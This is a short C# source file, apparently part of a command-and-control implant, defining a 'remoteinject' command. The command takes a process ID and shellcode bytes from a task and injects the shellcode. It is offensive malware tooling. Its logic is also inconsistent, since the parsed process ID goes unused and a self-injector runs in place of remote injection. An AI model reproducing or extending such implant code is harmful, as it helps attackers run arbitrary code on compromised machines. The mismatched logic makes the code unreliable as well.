using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class RemoteInject : AgentCommand
    {
        public override string Name => "remoteinject";

        public override string Execute(AgentTask task)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                return "Failed to parse PID";
            }

            var injector = new SelfInjector();
            var success = injector.Inject(task.FileBytes);

            if (success) return "Shellcode injected";
            return "Fail to inject shellcode";
        }
    }
}
